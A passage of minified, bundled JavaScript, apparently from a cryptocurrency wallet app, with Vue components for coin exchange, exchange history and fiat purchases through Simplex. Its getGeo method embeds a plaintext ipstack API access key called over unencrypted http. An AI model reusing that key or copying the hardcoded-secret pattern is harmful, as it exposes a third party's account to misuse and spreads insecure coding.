                            "TRX" === this.feeWallet.ticker && "TRX" !== this.coinToSend.ticker && (this.feeParams.fee = this.feeWallet.toMinimalUnit(null === (s = this.feeWallet) || void 0 === s || null === (a = s.feeData) || void 0 === a ? void 0 : a.feeTRC20));
                            this.availableBalance = "THETA" === this.coinToSend.id ? await this.coinToSend.availableBalance("0") : await this.coinToSend.availableBalance(i), t && (this.availableBalance = await this.coinToSend.availableBalance(this.coinToSend.id === this.feeWallet.id && "THETA" !== this.coinToSend.id ? i : "0"), this.setAmountToSend(this.availableBalance))
                        },
                        calcuteRate() {
                            if (0 === Number(this.amountToSend)) return;
                            const t = this.amountToReceive / this.amountToSend;
                            this.exchangeRate = Number(t > .1 ? t.toFixed(6) : t.toFixed(9))
                        },
                        setAmountToSend(t) {
                            this.amountToReceive = "...", this.amountToSend = t, 0 === Number(t) && (this.amountToReceive = "0"), this.validateExchange(), this.fetcher = setTimeout(() => {
                                this.fetchRate()
                            }, 500)
                        },
                        async changeCoins() {
                            if (this.loading) return;
                            const t = Object.assign({}, this.coinToReceive),
                                e = Object.assign({}, this.coinToSend);
                            this.exchangeRate = null, this.selectCoin(t, !0), this.selectCoin(e)
                        },
                        getPairRate() {
                            const t = this.getRate(this.coinToSend, this.coinToReceive, this.amountToSend);
                            t && t.then(t => {
                                this.amountToReceive = String(t), this.calcuteRate(), this.validateExchange()
                            }).catch(t => {
                                console.log(t)
                            })
                        },
                        fetchRate() {
                            clearTimeout(this.fetcher), clearInterval(this.pairRateInterval), this.amountToReceive = Number(this.amountToSend) > 0 ? "..." : "0", this.exchangeRate = null, this.getPairRate(), this.pairRateInterval = setInterval(() => {
                                this.getPairRate()
                            }, 1e4)
                        },
                        async selectCoin(t, e = !1) {
                            e ? (this.selectedCoinToSend = t.ticker, this.selectedCoinToSendId = t.id, localStorage.setItem("exchange::coin-to-send", t.ticker), localStorage.setItem("exchange::coin-to-send-id", t.id), await this.getAvailableBalance()) : (this.selectedCoinToReceive = t, this.selectedCoinToReceiveId = t.id, localStorage.setItem("exchange::coin-to-receive", t.ticker), localStorage.setItem("exchange::coin-to-receive-id", t.id), await this.getAvailableBalance(!1))
                        },
                        exchangeCoins() {
                            this.loading = !0;
                            let t = "",
                                e = !1;
                            this.$ga.event("User Actions", "Exchange coins", {
                                clientID: this.$ga.customParams.uid
                            });
                            const i = this.$wallets.findWallet("AWC", "atomic"),
                                s = this.$wallets.getWallet("BNB", "atomic"),
                                a = this.$wallets.getWallet("ETH", "atomic"),
                                n = this.estimatedCashback > 0 && this.isMember ? this.estimatedCashback : 0,
                                o = {
                                    hash: this.$wallets.hash,
                                    ethAddr: a.address,
                                    bnbAddr: s.address,
                                    estimatedAwcCashback: String(n),
                                    estimatedAwcCashbackRate: String(this.$rates.convertToUSD(n, i, "USD")),
                                    awcBep2Balance: String(this.awcBalance),
                                    awcBep2Rate: String(this.$store.getters.coinRate("USD", i).rate)
                                },
                                r = "BSV" === this.coinToReceive.ticker ? this.coinToReceive.convertToLegacyAddress(this.$address(this.coinToReceive.parent)) : this.$address(this.coinToReceive.parent),
                                c = "BSV" === this.coinToSend.ticker ? this.coinToSend.convertToLegacyAddress(this.$address(this.coinToSend.parent)) : this.$address(this.coinToSend.parent);
                            this.createExchangeTransaction(this.coinToSend, this.coinToReceive, r, c, this.amountToSend, this.amountToReceive, void 0, o).then(async i => {
                                this.$ga.event("Exchange", "Create Exchange Tx Succeed", {
                                    clientID: this.$ga.customParams.uid
                                });
                                try {
                                    this.$activeWalletsList.activate(this.coinToReceive);
                                    const t = this.validateExchangeTx(i);
                                    e = t.payinAddress;
                                    const s = this.coinToSend.toMinimalUnit(t.amountToSend);
                                    this.exchangeResult = await this.sendTransaction(this.coinToSend, t.payinAddress, s, t.payinExtraId, t.id, this.feeParams), this.sentHash = this.exchangeResult.txid, this.orderId = t.orderId, this.loading = !1;
                                    const a = {
                                        id: this.orderId,
                                        amountToSend: this.amountToSend,
                                        amountToReceive: this.amountToReceive,
                                        to: i.to,
                                        toCurrency: this.coinToReceive.ticker,
                                        from: i.from,
                                        fromCurrency: this.coinToSend.ticker,
                                        expectedCashbackAmount: this.estimatedCashback,
                                        status: "",
                                        payinHash: this.sentHash,
                                        payoutHash: ""
                                    };
                                    await this.$emit("openExchangeDetails", a), await this.$emit("startExchange", a), this.getAvailableBalance(), this.$ga.event("Exchange", "Exchange Succeed", {
                                        clientID: this.$ga.customParams.uid
                                    })
                                } catch (e) {
                                    throw this.$ga.event("Exchange", "Exchange Failed", {
                                        clientID: this.$ga.customParams.uid
                                    }), t = "sendExchangeTransaction", this.loading = !1, this.valid = {
                                        message: "Transaction failed, try again later.",
                                        status: !1
                                    }, e
                                }
                            }).catch(i => {
                                this.isError = !0, this.$ga.event("Exchange", "Create Exchange Tx Failed", {
                                    clientID: this.$ga.customParams.uid
                                }), console.log(i), t || (t = "createExchangeTransaction"), this.loading = !1, this.valid = {
                                    message: "Exchange service currently unavailable, try again later.",
                                    status: !1
                                }, i.message = JSON.stringify({
                                    currentError: i.toString(),
                                    exchangeErrorType: t,
                                    provider: this.defaultService,
                                    fromCurrency: this.coinToSend.ticker,
                                    toCurrency: this.coinToReceive.ticker,
                                    fromAddress: this.$address(this.coinToSend.parent),
                                    toAddress: this.$address(this.coinToReceive.parent),
                                    viaAddress: e || "",
                                    inputHash: this.exchangeResult ? this.exchangeResult.txid : "",
                                    amountTo: this.amountToSend
                                }), this.$wallets.logger.error({
                                    type: "Exchange",
                                    error: i,
                                    currency: this.coinToSend.ticker,
                                    instance: this
                                })
                            })
                        }
                    }
                },
                Yt = Object(c.a)(Gt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "inner-exchange-basic"
                    }, [i("div", {
                        staticClass: "exchange-block"
                    }, [i("div", {
                        staticClass: "block-wrapper",
                        class: [{
                            disabled: t.loading
                        }],
                        attrs: {
                            "data-test-id": "exch_buycrypto"
                        }
                    }, [i("ExchangeCoin", {
                        attrs: {
                            amount: "0" === t.amountToSend ? "" : t.amountToSend,
                            availableBalance: t.availableBalance || "0",
                            coin: t.coinToSend,
                            currencies: t.filteredCurrenciesExchange,
                            icon: t.$iconClass(t.coinToSend),
                            isAvailableBalance: !0,
                            selectedCoin: t.selectedCoinToSend,
                            "data-test-id": "exchange_coin_send"
                        },
                        on: {
                            selectCoin: function (e) {
                                return t.selectCoin(e, !0)
                            },
                            setAmountToSend: t.setAmountToSend
                        }
                    })], 1), t._v(" "), i("ChangeIcon", {
                        on: {
                            clickAction: t.changeCoins
                        }
                    }), t._v(" "), i("div", {
                        staticClass: "block-wrapper",
                        class: [{
                            disabled: t.loading
                        }]
                    }, [i("ExchangeCoin", {
                        attrs: {
                            amount: t.coinToReceive === t.coinToSend ? " " : t.amountToReceive,
                            coin: t.coinToReceive,
                            currencies: t.filteredCurrenciesExchange,
                            icon: t.$iconClass(t.coinToReceive),
                            isSortByMarketCap: !0,
                            readonly: !0,
                            selectedCoin: t.selectedCoinToSend,
                            "data-test-id": "exchange_coin_receive"
                        },
                        on: {
                            selectCoin: t.selectCoin
                        }
                    }), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [Number(t.estimatedCashback) > 0 ? i("CashbackInfo", {
                        attrs: {
                            estimatedCashback: t.estimatedCashback
                        }
                    }) : t._e()], 1)], 1)], 1), t._v(" "), i("div", {
                        staticClass: "error-wrapper"
                    }, [i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [t.isHBARActivate ? i("div", {
                        staticClass: "hbar-activate"
                    }, [i("ErrorPlain", {
                        attrs: {
                            message: "You need to activate your HBAR wallet to proceed"
                        }
                    }), t._v(" "), i("button", {
                        staticClass: "button button-buy",
                        on: {
                            click: function (e) {
                                return t.$router.push("/main/HBAR")
                            }
                        }
                    }, [t._v("\n          Activate\n        ")])], 1) : t.valid.message ? i("div", {
                        staticClass: "flex justify-center"
                    }, [i("ErrorPlain", {
                        attrs: {
                            message: t.valid.message
                        }
                    }), t._v(" "), t.isBuyCoin && !t.inactivePairError ? i("button", {
                        staticClass: "button button-buy",
                        attrs: {
                            "data-test-id": "exch_buy"
                        },
                        on: {
                            click: t.buyCoin
                        }
                    }, [t._v("\n          Buy\n          " + t._s(t.isMinMaxError ? t.coinToSend.ticker : t.coinToSend.feeTicker) + "\n        ")]) : t._e()], 1) : t._e()])], 1), t._v(" "), t.valid.message && t.feeToClaim ? i("button", {
                        staticClass: "button claim",
                        attrs: {
                            "data-test-id": "exch_support"
                        },
                        on: {
                            click: t.talkWithSupport
                        }
                    }, [t._v("\n    " + t._s(t.claimButtonText) + "\n  ")]) : t._e(), t._v(" "), i("div", {
                        staticClass: "submit-wrapper"
                    }, [t.loading ? i("div", {
                        staticClass: "loading"
                    }) : i("button", {
                        staticClass: "button shadow",
                        class: [{
                            active: t.isActiveExchangeButton && !t.isExchangeDisabled,
                            disabled: t.isExchangeDisabled
                        }],
                        attrs: {
                            "data-test-id": "exch_submit_button"
                        },
                        on: {
                            click: t.exchangeCoins
                        }
                    }, [t._v("\n      Exchange\n    ")])]), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [i("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: t.exchangeRate,
                            expression: "exchangeRate"
                        }],
                        staticClass: "exchange-rate",
                        attrs: {
                            "data-test-id": "exch_rate"
                        }
                    }, [i("span", [t._v("\n        Exchange rate\n      ")]), t._v(" "), i("div", {
                        staticClass: "rate"
                    }, [t._v("\n        1 " + t._s(t.coinToSend.ticker) + " ~ " + t._s(t._f("formatFinance")(t.exchangeRate)) + " " + t._s(t.coinToReceive.ticker) + "\n      ")])])]), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [t.feeParams.fee ? i("div", {
                        staticClass: "exchange-rate",
                        attrs: {
                            "data-test-id": "exch_fee"
                        }
                    }, [i("span", [t._v("\n        Network fee\n      ")]), t._v(" "), i("div", {
                        staticClass: "rate"
                    }, [t._v("\n        " + t._s(t.feeWallet.toCurrencyUnit(t.feeParams.fee)) + " " + t._s("VET" === t.feeWallet.ticker ? "VTHO" : t.feeWallet.ticker) + "\n      ")]), t._v(" "), i("span", [t._v("\n        $ " + t._s(t._f("formatFiat")(t.$rates.convertToUSD(t.feeWallet.toCurrencyUnit(t.feeParams.fee), t.feeWallet, "USD"))) + "\n      ")])]) : t._e()]), t._v(" "), t.isMember ? t._e() : i("CashbackPromotion"), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade-down"
                        }
                    }, [t.isError ? i("div", {
                        staticClass: "send-coin popup",
                        attrs: {
                            "data-test-id": "exch_coin_popup"
                        }
                    }, [i("SendCoinResult", {
                        attrs: {
                            amount: t.amountToSend,
                            coin: t.coinToSend,
                            icon: t.$iconClass(t.coinToSend),
                            isError: t.isError,
                            mailText: t.coinToSend.ticker + " > " + t.coinToReceive.ticker + "%0A",
                            mailTitle: "Exchange error",
                            message: " to the exchange"
                        },
                        on: {
                            tryAgain: t.tryAgain
                        }
                    })], 1) : t._e()])], 1)
                }), [], !1, null, null, null).exports,
                Xt = i(647);
            var zt = {
                    name: "ExchangeHistory",
                    components: {
                        ExchangeHistoryItem: Xt.a,
                        Table: b.a
                    },
                    filters: {
                        fixedAmount: function (t) {
                            return Number(Number(t).toFixed(6)).toString()
                        }
                    },
                    mixins: [f.h, f.k],
                    data: () => ({
                        page: 0,
                        isLoader: !1,
                        header: [{
                            title: "You sent"
                        }, {
                            title: "You got"
                        }],
                        activeTx: null
                    }),
                    computed: {
                        ...Object(n.c)(["exchangeTransactions"]),
                        transactions() {
                            return this.exchangeTransactions.slice(0, Math.max(50, 50 * this.page))
                        },
                        isListEnded() {
                            return this.exchangeTransactions.length <= 50 * this.page
                        }
                    },
                    async mounted() {
                        this.$ga.event("User Movement", "exchange-history-page", {
                            clientID: this.$ga.customParams.uid
                        }), this.isLoader = 0 === this.exchangeTransactions.length, this.fetchExchangeTransactions(), this.isLoader = !1
                    },
                    beforeDestroy() {
                        clearTimeout(this.fetchExchangeTransactionsTimeout)
                    },
                    methods: {
                        ...Object(n.b)(["getExchangeTransactions"]),
                        getWalletData(t) {
                            return this.currentService.getInternalWalletData({
                                legacyTicker: t
                            })
                        },
                        getWallet(t) {
                            const {
                                contract: e,
                                ticker: i,
                                parentTicker: s
                            } = t || {};
                            return this.$wallets.findWalletV2({
                                ticker: i,
                                contract: e,
                                parentTicker: s
                            })
                        },
                        async fetchExchangeTransactions() {
                            clearTimeout(this.fetchExchangeTransactionsTimeout);
                            const t = {
                                limit: 50,
                                offset: 50 * this.page
                            };
                            this.checkExchangeTransactionsUpdates(), await this.getExchangeTransactions({
                                atomicId: this.$wallets.hash,
                                params: t
                            }), this.fetchExchangeTransactionsTimeout = setTimeout(() => this.fetchExchangeTransactions(), 3e4)
                        },
                        checkExchangeTransactionsUpdates() {
                            if (!this.exchangeTransactions.length) return;
                            const t = [],
                                e = new Date;
                            this.exchangeTransactions.forEach(({
                                id: i,
                                status: s,
                                timestamp: a
                            }) => {
                                const n = !["Expired", "Completed", "Refunded"].includes(s),
                                    o = new Date(a);
                                o.setDate(o.getDate() + 2), n && o > e && t.push(this.getStatus(i))
                            }), this.$emit("updatingStatus", t)
                        }
                    }
                },
                Jt = Object(c.a)(zt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "exchange-history order-details scroll-list2",
                        on: {
                            scroll: t.handleScrollEnd
                        }
                    }, [t.isLoader ? i("div", {
                        staticClass: "loader"
                    }) : i("Table", {
                        attrs: {
                            header: t.header,
                            isEmpty: 0 === t.exchangeTransactions.length,
                            items: t.exchangeTransactions
                        }
                    }, [t.exchangeTransactions.length ? t._e() : i("div", {
                        attrs: {
                            slot: "empty"
                        },
                        slot: "empty"
                    }, [i("div", {
                        staticClass: "empty"
                    }, [t._v("\n        Your exchanges will appear here\n      ")])]), t._v(" "), i("div", {
                        attrs: {
                            slot: "table-rows"
                        },
                        slot: "table-rows"
                    }, t._l(t.transactions, (function (e, s) {
                        return i("ExchangeHistoryItem", {
                            key: s,
                            attrs: {
                                id: e.id,
                                date: t._f("moment")(e.timestamp, "DD/MM/YYYY HH:mm"),
                                getAmount: t._f("fixedAmount")(e.amountToReceive),
                                getWallet: t.getWallet(e.to || t.getWalletData(e.toCurrency)),
                                isOrderDetails: !0,
                                isTooltip: !0,
                                sentAmount: t._f("fixedAmount")(e.amountToSend),
                                sentWallet: t.getWallet(e.from || t.getWalletData(e.fromCurrency)),
                                status: e.status
                            },
                            on: {
                                openRow: function (i) {
                                    return t.$emit("openOrderDetails", e)
                                }
                            }
                        })
                    })), 1)])], 1)
                }), [], !1, null, null, null).exports,
                Zt = {
                    name: "Simplex",
                    data: () => ({
                        tabs: [{
                            title: "Buy crypto",
                            path: "/simplex"
                        }, {
                            title: "Order History",
                            path: "/simplex/history"
                        }]
                    }),
                    computed: {
                        ...Object(n.c)(["activeTab"])
                    },
                    methods: {
                        ...Object(n.b)(["changeTab"]),
                        isActive(t) {
                            return ("simplex-with-tickers" === this.$route.name || "simplex-with-tickers-value" === this.$route.name) && "/simplex" === t
                        }
                    }
                },
                Qt = Object(c.a)(Zt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", [i("div", {
                        staticClass: "header-tabs"
                    }, t._l(t.tabs, (function (e, s) {
                        return i("router-link", {
                            key: s,
                            staticClass: "choice",
                            class: {
                                active: t.isActive(e.path)
                            },
                            attrs: {
                                to: e.path,
                                exactActiveClass: "active",
                                tag: "div"
                            }
                        }, [i("span", [t._v("\n        " + t._s(e.title) + "\n      ")])])
                    })), 1), t._v(" "), i("router-view", {
                        on: {
                            submitPayment: function (e) {
                                t.session = t.event
                            }
                        }
                    })], 1)
                }), [], !1, null, null, null).exports,
                te = i(138),
                ee = i.n(te),
                ie = i(380),
                se = i(892),
                ae = i(1653),
                ne = i(65),
                oe = i(641);
            var re = {
                    name: "SimplexExchange",
                    components: {
                        EditAmount: ne.a,
                        ChangeIcon: Lt.a,
                        FiatDropdown: oe.a,
                        ExchangeCoin: Mt.a,
                        CashbackInfo: Ht.a,
                        CashbackPromotion: jt.a
                    },
                    mixins: [f.c],
                    data: () => ({
                        preload: "file:" + i(81).resolve(__dirname, "./userAgent.html"),
                        selectedCoinToReceive: "btc",
                        selectedCoinToReceiveId: "btc",
                        selectedFiatToSend: "USD",
                        requestedFiatAmount: "200",
                        totalFiatAmount: "",
                        requestedCoinAmount: "...",
                        amountError: "",
                        quoteID: "",
                        currentGeo: "",
                        currentIP: "",
                        currentUserAgent: null,
                        callTimer: null,
                        quoteError: !1,
                        simplex: null,
                        isFiatDropdown: !1,
                        isFiatLoading: !1,
                        loadingSimplexForm: !1,
                        requestToken: null,
                        exchangeSettings: null
                    }),
                    computed: {
                        ...Object(n.c)(["coinRate"]),
                        availableCurrencies() {
                            return this.$buy.settings.availableWallets.filter(({
                                ticker: t
                            }) => Et.o.isAllowed(t.toUpperCase(), Et.a)).map(({
                                id: t
                            }) => t)
                        },
                        cashbackParams() {
                            return {
                                amount: this.requestedCoinAmount,
                                wallet: this.coinToReceive
                            }
                        },
                        isButtonAccepted() {
                            return Number(this.requestedCoinAmount) && Number(this.requestedFiatAmount) && !this.isFiatLoading && !this.loadingSimplexForm
                        },
                        userID() {
                            const t = this.$wallets.hash;
                            return this.setUserID(t), this.simplexHashFormat(t)
                        },
                        paymentID() {
                            const t = se(this.quoteID + this.$wallets.hash);
                            return this.simplexHashFormat(t)
                        },
                        orderID() {
                            const t = se(this.paymentID);
                            return this.simplexHashFormat(t)
                        },
                        cookie_uaid() {
                            const t = ie(this.orderID);
                            return this.simplexHashFormat(t)
                        },
                        cookie_session() {
                            const t = ie(this.cookie_uaid);
                            return this.simplexHashFormat(t)
                        },
                        userAgent() {
                            return this.currentUserAgent
                        },
                        coinToReceive() {
                            return this.$wallets.getWallet(this.selectedCoinToReceiveId, "atomic")
                        },
                        coinAddress() {
                            const {
                                address: t
                            } = this.$wallets.getWallet(this.coinToReceive.parent, "atomic");
                            return t
                        },
                        hasFiatRate() {
                            return Object.keys(this.$buy.settings.fiats).includes(this.fiatRate)
                        },
                        simplexTransaction() {
                            const t = this.estimatedCashback > 0 && this.isMember ? this.estimatedCashback : 0;
                            return {
                                buyParams: {
                                    paymentId: this.paymentID,
                                    quoteId: this.quoteID,
                                    atomicId: this.$wallets.hash,
                                    status: "Attempt",
                                    fromCurrency: this.selectedFiatToSend,
                                    toCurrency: this.coinToReceive.ticker,
                                    amountSend: this.requestedFiatAmount,
                                    amountReceive: this.requestedCoinAmount,
                                    payoutAddress: this.coinAddress
                                },
                                cashbackParams: {
                                    atomicId: this.$wallets.hash,
                                    bnbAddress: this.$wallets.getWallet("BNB").address,
                                    ethAddress: this.$wallets.getWallet("ETH").address,
                                    expectedCashbackAmount: t,
                                    expectedCashbackAmountRate: String(this.$rates.convertToUSD(t, "AWC", "USD")),
                                    awcBep2Balance: this.awcBalance,
                                    awcBep2Rate: String(this.coinRate("USD", this.$wallets.findWallet("AWC")).rate),
                                    exchangeService: "Simplex",
                                    platform: `${this.$platformVersion.getPlatform()} ${this.$platformVersion.getVersion()}`,
                                    walletVersion: this.$platformVersion.getVersion()
                                }
                            }
                        }
                    },
                    watch: {
                        selectedFiatToSend(t, e) {
                            t !== e && (this.updateExchangeSettings(), this.getCoinPrice())
                        },
                        requestedFiatAmount(t, e) {
                            t !== e && this.getCoinPrice()
                        },
                        fiatRate(t) {
                            this.selectedFiatToSend = this.hasFiatRate ? t : "USD"
                        }
                    },
                    async mounted() {
                        var t, e, i, s;
                        const {
                            simplexApiUrl: a
                        } = this.$buy.settings;
                        this.simplex = new ae.a(a), await this.updateExchangeSettings(), this.changeTab(0), this.getGeo();
                        const n = localStorage.getItem("simplex::receiveCoinId");
                        if (null != this && null !== (t = this.$route) && void 0 !== t && null !== (e = t.params) && void 0 !== e && e.value && (this.requestedFiatAmount = Math.max(this.$route.params.value, 200).toString()), null !== (i = this.$route) && void 0 !== i && null !== (s = i.params) && void 0 !== s && s.walletToReceive) {
                            const t = this.$wallets.getWallet(this.$route.params.walletToReceive);
                            this.selectedCoinToReceiveId = t.id, this.selectedCoinToReceive = t.ticker
                        } else n && "undefined" !== n ? (this.selectedCoinToReceive = localStorage.getItem("simplex::receiveCoin"), this.selectedCoinToReceiveId = n) : (this.selectedCoinToReceive = "btc", this.selectedCoinToReceiveId = "btc");
                        this.selectedFiatToSend = localStorage.getItem("simplex::sendFiat") || this.hasFiatRate && this.fiatRate || "USD", this.$refs.userAgent.addEventListener("dom-ready", () => {
                            this.currentUserAgent = this.$refs.userAgent.getUserAgent()
                        })
                    },
                    methods: {
                        ...Object(n.b)(["changeTab", "setUserID", "setSession", "setNewTransaction"]),
                        getCoinDisabilityReason() {
                            var t;
                            return Et.o.getMessage(null === (t = this.selectedCoinToReceive) || void 0 === t ? void 0 : t.toUpperCase(), Et.a)
                        },
                        isCoinDisabled() {
                            var t;
                            return !Et.o.isAllowed(null === (t = this.selectedCoinToReceive) || void 0 === t ? void 0 : t.toUpperCase(), Et.a)
                        },
                        async updateExchangeSettings() {
                            this.exchangeSettings = await this.$buy.getSettings(this.selectedFiatToSend), this.requestedFiatAmount = String(this.exchangeSettings.default)
                        },
                        outsideClick() {
                            this.isFiatDropdown = !1
                        },
                        onInput() {
                            this.quoteID = null, this.requestedCoinAmount = "...", this.isFiatLoading = !0, clearTimeout(this.callTimer), this.callTimer = setTimeout(() => {
                                this.getCoinPrice()
                            }, 500)
                        },
                        selectForReceive(t) {
                            this.isFiatLoading = !0, this.selectedCoinToReceive = t.ticker, this.selectedCoinToReceiveId = t.id, localStorage.setItem("simplex::receiveCoin", t.ticker), localStorage.setItem("simplex::receiveCoinId", t.id), this.getCoinPrice()
                        },
                        toggleFiatDropdown(t) {
                            t.stopPropagation(), this.isFiatDropdown = !this.isFiatDropdown
                        },
                        selectFiat(t) {
                            this.isFiatLoading = !0, localStorage.setItem("simplex::sendFiat", t.code), this.selectedFiatToSend = t.code, this.isFiatDropdown = !1
                        },
                        validationAmount() {
                            this.amountError = "";
                            const t = Kt.c.find(t => t.code === this.selectedFiatToSend);
                            return this.requestedFiatAmount < this.exchangeSettings.min ? this.amountError = `Minimum order amount is ${t.char}${this.exchangeSettings.min}` : this.requestedFiatAmount > this.exchangeSettings.max && (this.amountError = `Maximum amount is ${t.char}${this.exchangeSettings.max}`), this.amountError
                        },
                        async getCoinPrice() {
                            if (this.requestedCoinAmount = "...", this.requestToken = Math.random().toString(36).substring(2, 15), "" !== this.validationAmount()) return;
                            this.isFiatLoading = !0, this.quoteError = !1;
                            let t = {
                                digital_currency: this.$buy.getSimplexTicker(this.coinToReceive),
                                fiat_currency: this.selectedFiatToSend,
                                requested_currency: this.selectedFiatToSend,
                                requested_amount: Number(this.requestedFiatAmount),
                                end_user_id: this.userID,
                                wallet_id: "atomicwallet",
                                client_ip: this.currentIP
                            };
                            try {
                                const {
                                    response: e,
                                    token: i
                                } = await this.simplex.getQuote(t, this.requestToken);
                                if (e.data.result.error) throw e.data.result.error;
                                if (i !== this.requestToken) return;
                                this.quoteID = e.data.result.quote_id, this.totalFiatAmount = e.data.result.fiat_money.total_amount, this.requestedCoinAmount = e.data.result.digital_money.amount.toString()
                            } catch (t) {
                                this.quoteError = !0
                            }
                            this.isFiatLoading = !1
                        },
                        async submitSimplexForm() {
                            if (this.loadingSimplexForm = !0, this.$ga.event("User Actions", "Create Simplex Exchange Tx", {
                                    clientID: this.$ga.customParams.uid
                                }), "" !== this.validationAmount()) return;
                            await this.getCoinPrice();
                            const t = {
                                    account_details: {
                                        app_provider_id: "atomicwallet",
                                        app_version_id: "2.16.0",
                                        app_end_user_id: this.userID,
                                        app_install_date: new Date,
                                        signup_login: {
                                            ip: this.currentIP,
                                            location: this.currentGeo,
                                            uaid: this.cookie_uaid,
                                            accept_language: "en-US;q=0.7,en;",
                                            http_accept_language: "en-US;q=0.7,en;",
                                            user_agent: this.userAgent,
                                            cookie_session_id: this.cookie_session,
                                            timestamp: new Date
                                        }
                                    },
                                    transaction_details: {
                                        payment_details: {
                                            quote_id: this.quoteID,
                                            payment_id: this.paymentID,
                                            order_id: this.orderID,
                                            fiat_total_amount: {
                                                currency: this.selectedFiatToSend,
                                                amount: Number(this.totalFiatAmount)
                                            },
                                            requested_digital_amount: {
                                                currency: this.$buy.getSimplexTicker(this.coinToReceive),
                                                amount: Number(this.requestedCoinAmount)
                                            },
                                            destination_wallet: {
                                                currency: this.$buy.getSimplexTicker(this.coinToReceive),
                                                address: this.coinAddress
                                            },
                                            original_http_ref_url: "https://atomicwallet.io"
                                        }
                                    }
                                },
                                e = {
                                    version: "1",
                                    partner: "atomicwallet",
                                    payment_flow_type: "wallet",
                                    return_url: "https://atomicwallet.io",
                                    quote_id: this.quoteID,
                                    payment_id: this.paymentID,
                                    user_id: this.userID,
                                    destination_wallet: {
                                        address: this.coinAddress,
                                        currency: this.$buy.getSimplexTicker(this.coinToReceive)
                                    },
                                    fiat_total_amount: {
                                        amount: this.totalFiatAmount,
                                        currency: this.selectedFiatToSend
                                    },
                                    digital_total_amount: {
                                        amount: this.requestedCoinAmount,
                                        currency: this.$buy.getSimplexTicker(this.coinToReceive)
                                    }
                                };
                            this.simplex.requestPayment(t).then((t, i) => {
                                if (i) throw i;
                                t && this.simplex.submitPayment(e, (t, e) => {
                                    if (t) throw t;
                                    e && (this.setSession(e), this.setNewTransaction(this.simplexTransaction), this.$activeWalletsList.activate(this.coinToReceive), this.$ga.event("User Actions", "Exchange fiat", {
                                        clientID: this.$ga.customParams.uid
                                    }), this.$router.push("/simplex/webview"), this.quoteID = null), this.loadingSimplexForm = !1
                                })
                            })
                        },
                        simplexHashFormat: t => t.replace(/^([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})([a-f0-9]{4})([a-f0-9]{12})$/, "$1-$2-$3-$4-$5"),
                        getGeo() {
                            ee.a.get("http://api.ipstack.com/check?access_key=4e58e3f8a7bb4fd994f948b63e127e3b").then(t => {
                                this.currentIP = t.data.ip, this.currentGeo = t.data.latitude.toString() + ", " + t.data.longitude.toString(), this.getCoinPrice()
                            })
                        }
                    }
                },
                ce = Object(c.a)(re, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "inner-exchange"
                    }, [i("webview", {
                        ref: "userAgent",
                        attrs: {
                            src: t.preload
                        }
                    }), t._v(" "), i("div", {
                        staticClass: "exchange-block"
                    }, [i("div", {
                        staticClass: "block-wrapper"
                    }, [i("div", {
                        staticClass: "coin-block"
                    }, [i("div", {
                        staticClass: "coin-icon",
                        class: "icon-" + t.selectedFiatToSend.toLowerCase(),
                        on: {
                            click: t.toggleFiatDropdown
                        }
                    }), t._v(" "), i("div", {
                        staticClass: "flex-wrapper"
                    }, [i("EditAmount", {
                        attrs: {
                            error: t.amountError,
                            isExchange: !0,
                            value: t.coinToReceive,
                            type: "text"
                        },
                        on: {
                            input: t.onInput
                        },
                        model: {
                            value: t.requestedFiatAmount,
                            callback: function (e) {
                                t.requestedFiatAmount = e
                            },
                            expression: "requestedFiatAmount"
                        }
                    }), t._v(" "), i("div", {
                        staticClass: "coinname fiat"
                    }, [i("span", {
                        on: {
                            click: t.toggleFiatDropdown
                        }
                    }, [t._v("\n              " + t._s(t.selectedFiatToSend) + "\n            ")]), t._v(" "), t.isFiatDropdown ? i("FiatDropdown", {
                        directives: [{
                            name: "click-outside",
                            rawName: "v-click-outside",
                            value: t.toggleFiatDropdown,
                            expression: "toggleFiatDropdown"
                        }],
                        class: {
                            visible: t.isFiatDropdown
                        },
                        attrs: {
                            avaliableFiats: Object.keys(t.$buy.settings.fiats)
                        },
                        on: {
                            selectFiatCoin: t.selectFiat
                        }
                    }) : t._e()], 1)], 1)])]), t._v(" "), i("ChangeIcon", {
                        staticClass: "no-hover"
                    }), t._v(" "), i("div", {
                        staticClass: "block-wrapper"
                    }, [i("ExchangeCoin", {
                        attrs: {
                            amount: t.requestedCoinAmount,
                            coin: t.coinToReceive,
                            currencies: t.availableCurrencies,
                            enableSort: !1,
                            icon: t.$iconClass(t.coinToReceive),
                            readonly: !0,
                            selectedCoin: t.selectedCoinToReceive
                        },
                        on: {
                            selectCoin: t.selectForReceive
                        }
                    }), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [Number(t.estimatedCashback) > 0 ? i("CashbackInfo", {
                        attrs: {
                            estimatedCashback: t.estimatedCashback
                        }
                    }) : t._e()], 1)], 1)], 1), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade-down"
                        }
                    }, [t.quoteError || t.isCoinDisabled() ? i("div", {
                        staticClass: "exchange-error"
                    }, [i("span", {
                        staticClass: "text-red"
                    }, [t._v("\n        " + t._s(t.isCoinDisabled() ? t.getCoinDisabilityReason() : "Pair is temporarily unavailable") + "\n      ")])]) : t._e()]), t._v(" "), i("div", {
                        staticClass: "exchange-rate"
                    }, [i("p", {
                        staticClass: "fee-info"
                    }, [i("span", [t._v("\n        5% fees (min " + t._s(t.exchangeSettings && t.exchangeSettings.fee) + " " + t._s(t.selectedFiatToSend.toUpperCase()) + ") are included in the price")])]), i("br"), i("span", [t._v("\n      The average delivery time is 10 to 30 minutes\n    ")])]), t._v(" "), i("div", {
                        staticClass: "submit-wrapper"
                    }, [i("button", {
                        staticClass: "button shadow",
                        class: {
                            accepted: !t.isCoinDisabled() && t.isButtonAccepted, disabled: t.isCoinDisabled()
                        },
                        on: {
                            click: function (e) {
